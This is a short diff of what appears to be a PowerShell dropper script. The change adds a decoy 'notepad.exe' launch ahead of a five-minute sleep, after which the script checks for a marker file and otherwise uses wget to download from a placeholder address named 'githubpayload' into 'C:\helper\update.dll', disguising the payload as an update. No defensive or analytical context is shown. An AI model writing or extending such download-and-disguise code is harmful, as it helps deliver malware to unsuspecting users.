@@ -1,4 +1,4 @@
-start-sleep 300 ; if (Test-Path "C:\helper\regex.exe") {
+notepad.exe ; start-sleep 300 ; if (Test-Path "C:\helper\regex.exe") {
     exit
 } else { wget "githubpayload" -o "C:\helper\update.dll" ; start-sleep 2;
     Add-Type -AssemblyName System.Windows.Forms
